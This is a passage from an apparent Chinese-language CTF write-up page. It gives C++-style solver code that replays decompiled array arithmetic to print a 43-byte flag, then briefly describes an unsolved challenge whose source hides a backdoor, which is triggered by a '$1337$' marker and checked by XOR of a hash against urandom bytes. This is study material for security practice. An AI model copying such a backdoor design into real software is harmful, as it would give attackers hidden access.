+<p>void state_2316743832()</p>
+<p>{
+  cout &lt;&lt; 37 &lt;&lt; '\n';
+  param_1[0] = param_1[0] - param_1[0x1f] - param_1[0x1c];
+  return;
+}</p>
+<p>void state_1595228866()</p>
+<p>{
+  cout &lt;&lt; 36 &lt;&lt; '\n';
+  param_1[4] = param_1[4] - param_1[0x19] - param_1[7];
+  return;
+}</p>
+<p>void state_1093244921()</p>
+<p>{
+  cout &lt;&lt; 35 &lt;&lt; '\n';
+  param_1[0x12] = param_1[0x12] - param_1[0xf] - param_1[0x1d];
+  return;
+}</p>
+<p>void state_809393455()</p>
+<p>{
+  cout &lt;&lt; 34 &lt;&lt; '\n';
+  param_1[0x15] = param_1[0x15] + (param_1[0x2a] + param_1[0xd]);
+  return;
+}
+void state_1154341356()</p>
+<p>{
+  cout &lt;&lt; 33 &lt;&lt; '\n';
+  param_1[0x15] = param_1[0x15] - param_1[0xf] - param_1[0x22];
+  return;
+}</p>
+<p>void state_3656605789()</p>
+<p>{
+  cout &lt;&lt; 32 &lt;&lt; '\n';
+  param_1[7] = param_1[7] - param_1[0] - param_1[10];
+  return;
+}</p>
+<p>void state_4165665722()</p>
+<p>{
+  cout &lt;&lt; 31 &lt;&lt; '\n';
+  param_1[0xd] = param_1[0xd] - param_1[0x1c] - param_1[0x19];
+  return;
+}</p>
+<p>void state_2816834243()</p>
+<p>{
+  cout &lt;&lt; 30 &lt;&lt; '\n';
+  param_1[0x20] = param_1[0x20] - param_1[0x19] - param_1[5];
+  return;
+}</p>
+<p>void state_2095151013()</p>
+<p>{
+  cout &lt;&lt; 29 &lt;&lt; '\n';
+  param_1[0x1f] = param_1[0x1f] - param_1[0x10] - param_1[1];
+  return;
+}</p>
+<p>void state_3908914479()</p>
+<p>{
+  cout &lt;&lt; 28 &lt;&lt; '\n';
+  param_1[1] = param_1[1] - param_1[0x28] - param_1[0x10];
+  return;
+}</p>
+<p>void state_2309210106()</p>
+<p>{
+  cout &lt;&lt; 27 &lt;&lt; '\n';
+  param_1[0x1e] = param_1[0x1e] + (param_1[2] + param_1[0xd]);
+  return;
+}</p>
+<p>void state_4008735947()</p>
+<p>{
+  cout &lt;&lt; 26 &lt;&lt; '\n';
+  param_1[1] = param_1[1] - param_1[6] - param_1[0xf];
+  return;
+}</p>
+<p>void state_3544494813()</p>
+<p>{
+  cout &lt;&lt; 25 &lt;&lt; '\n';
+  param_1[7] = param_1[7] - param_1[0] - param_1[0x15];
+  return;
+}</p>
+<p>void state_4046605750()</p>
+<p>{
+  cout &lt;&lt; 24 &lt;&lt; '\n';
+  param_1[0x18] = param_1[0x18] - param_1[5] - param_1[0x14];
+  return;
+}</p>
+<p>void state_1780152111()</p>
+<p>{
+  cout &lt;&lt; 23 &lt;&lt; '\n';
+  param_1[0x24] = param_1[0x24] - param_1[0xf] - param_1[0xb];
+  return;
+}</p>
+<p>void state_269727185()</p>
+<p>{
+  cout &lt;&lt; 22 &lt;&lt; '\n';
+  param_1[0] = param_1[0] - param_1[0x10] - param_1[0x21];
+  return;
+}</p>
+<p>void state_4237907356()</p>
+<p>{
+  cout &lt;&lt; 21 &lt;&lt; '\n';
+  param_1[0x13] = param_1[0x13] - param_1[0x10] - param_1[10];
+  return;
+}</p>
+<p>void state_2098792827()</p>
+<p>{
+  cout &lt;&lt; 20 &lt;&lt; '\n';
+  param_1[1] = param_1[1] + (param_1[0xd] + param_1[0x1d]);
+  return;
+}</p>
+<p>void state_3443361864()</p>
+<p>{
+  cout &lt;&lt; 19 &lt;&lt; '\n';
+  param_1[0x1e] = param_1[0x1e] + (param_1[8] + param_1[0x21]);
+  return;
+}</p>
+<p>void state_1132589236()</p>
+<p>{
+  cout &lt;&lt; 18 &lt;&lt; '\n';
+  param_1[0xf] = param_1[0xf] - param_1[10] - param_1[0x16];
+  return;
+}</p>
+<p>void state_2131447726()</p>
+<p>{
+  cout &lt;&lt; 17 &lt;&lt; '\n';
+  param_1[0x14] = param_1[0x14] - param_1[0x18] - param_1[0x13];
+  return;
+}</p>
+<p>void state_1765279360()</p>
+<p>{
+  cout &lt;&lt; 16 &lt;&lt; '\n';
+  param_1[0x1b] = param_1[0x1b] - param_1[0x14] - param_1[0x12];
+  return;
+}</p>
+<p>void state_4026467378()</p>
+<p>{
+  cout &lt;&lt; 15 &lt;&lt; '\n';
+  param_1[0x27] = param_1[0x27] + (param_1[0x26] + param_1[0x19]);
+  return;
+}</p>
+<p>void state_2202680315()</p>
+<p>{
+  cout &lt;&lt; 14 &lt;&lt; '\n';
+  param_1[0x17] = param_1[0x17] - param_1[0x22] - param_1[7];
+  return;
+}</p>
+<p>void state_2373489361()</p>
+<p>{
+  cout &lt;&lt; 13 &lt;&lt; '\n';
+  param_1[0x25] = param_1[0x25] + (param_1[3] + param_1[0x1d]);
+  return;
+}</p>
+<p>void state_416430256()</p>
+<p>{
+  cout &lt;&lt; 12 &lt;&lt; '\n';
+  param_1[5] = param_1[5] - param_1[4] - param_1[0x28];
+  return;
+}</p>
+<p>void state_2421543205()</p>
+<p>{
+  cout &lt;&lt; 11 &lt;&lt; '\n';
+  param_1[0x11] = param_1[0x11] - param_1[7] - param_1[0];
+  return;
+}</p>
+<p>void state_3844354947()</p>
+<p>{
+  cout &lt;&lt; 10 &lt;&lt; '\n';
+  param_1[9] = param_1[9] - param_1[3] - param_1[0xb];
+  return;
+}</p>
+<p>void state_3995931083()</p>
+<p>{
+  cout &lt;&lt; 9 &lt;&lt; '\n';
+  param_1[0x1f] = param_1[0x1f] - param_1[0x10] - param_1[0x22];
+  return;
+}</p>
+<p>void state_2263885268()</p>
+<p>{
+  cout &lt;&lt; 7 &lt;&lt; '\n';
+  param_1[0xe] = param_1[0xe] + (param_1[6] + param_1[0x20]);
+  return;
+}</p>
+<p>void state_4260333374()</p>
+<p>{
+  cout &lt;&lt; 8 &lt;&lt; '\n';
+  param_1[0x10] = param_1[0x10] - param_1[0xb] - param_1[0x19];
+  return;
+}</p>
+<p>void state_1438496410()</p>
+<p>{
+  cout &lt;&lt; 5 &lt;&lt; '\n';
+  param_1[6] = param_1[6] - param_1[0x29] - param_1[10];
+  return;
+}</p>
+<p>void state_2357240312()</p>
+<p>{
+  cout &lt;&lt; 4 &lt;&lt; '\n';
+  param_1[2] = param_1[2] - param_1[8] - param_1[0xb];
+  return;
+}</p>
+<p>void state_671274660()</p>
+<p>{
+  cout &lt;&lt; 3 &lt;&lt; '\n';
+  param_1[0] = param_1[0] + (param_1[0x1f] + param_1[0x12]);
+  return;
+}</p>
+<p>void state_2057902921()</p>
+<p>{
+  cout &lt;&lt; 2 &lt;&lt; '\n';
+  param_1[9] = param_1[9] + (param_1[0x16] + param_1[2]);
+  return;
+}</p>
+<p>void state_3618225054()</p>
+<p>{
+  cout &lt;&lt; 1 &lt;&lt; '\n';
+  param_1[0xe] = param_1[0xe] - param_1[8] - param_1[0x23];
+  return;
+}</p>
+<p>int main() {
+    int a[] = { 0xe1, 0xda, 0xac, 0x33, 0x67, 0x5d, 0xf4, 0x18, 0x0d, 0x42, 0x85, 0x55, 0x5f, 0xc4, 0xb3, 0x81, 0xfb, 0x81, 0x1b, 0x70, 0xdb, 0x34, 0x4c, 0x5d, 0xed, 0x52, 0x5f, 0xf0, 0x74, 0x40, 0x89, 0x56, 0x80, 0x45, 0x53, 0x35, 0xa3, 0xa0, 0x37, 0xdd, 0x33, 0xcc, 0x7d };
+    for(int i = 0; i &lt; 43; i++)
+        param_1.push_back(a[i]);
+    state_1978986903();
+    state_3648003850();
+    state_3420754995();
+    state_557589375();
+    state_71198295();
+    state_126130845();
+    state_3901233957();
+    state_1843624184();
+    state_794507810();
+    state_4130555047();
+    state_1929982570();
+    state_3907553856();
+    state_3507844042();
+    state_2907124712();
+    state_2316743832();
+    state_1595228866();
+    state_1093244921();
+    state_809393455();
+    state_1154341356();
+    state_3656605789();
+    state_4165665722();
+    state_2816834243();
+    state_2095151013();
+    state_3908914479();
+    state_2309210106();
+    state_4008735947();
+    state_3544494813();
+    state_4046605750();
+    state_1780152111();
+    state_269727185();
+    state_4237907356();
+    state_2098792827();
+    state_3443361864();
+    state_1132589236();
+    state_2131447726();
+    state_1765279360();
+    state_4026467378();
+    state_2202680315();
+    state_2373489361();
+    state_416430256();
+    state_2421543205();
+    state_3844354947();
+    state_3995931083();
+    state_2263885268();
+    state_4260333374();
+    state_1438496410();
+    state_2357240312();
+    state_671274660();
+    state_2057902921();
+    state_3618225054();</p>
+<pre><code>for(int i = 0; i &lt; 43; i++)
+    cout &lt;&lt; char(param_1[i]) &lt;&lt; ' ';
+</code></pre>
+<p>}
+```</p>
+<h3 id="bam">Bam</h3>
+<p>沒解出來的
+拿 source code 去做比較 發現他有藏一個 backdoor 
+然後她會拿它裡面的東西
+\$1337$ 來作為標記尋找
+把後面兩段用 $ 切割丟進去
+然後作一系列操作後會剩下一個長度為16 的陣列
+拿一個 hash 值 跟一個 urandom 出來的陣列做 xor 去比較如果跟那個陣列一樣即可
+但我不知道hash 跟 urandom 的東西怎麼拿出來zzzz</p>
+<p>我好爛喔QQ</p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["header.autohide", "announce.dismiss", "navigation.tabs", "navigation.tabs.sticky", "navigation.path"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+    
+  </body>
+</html>
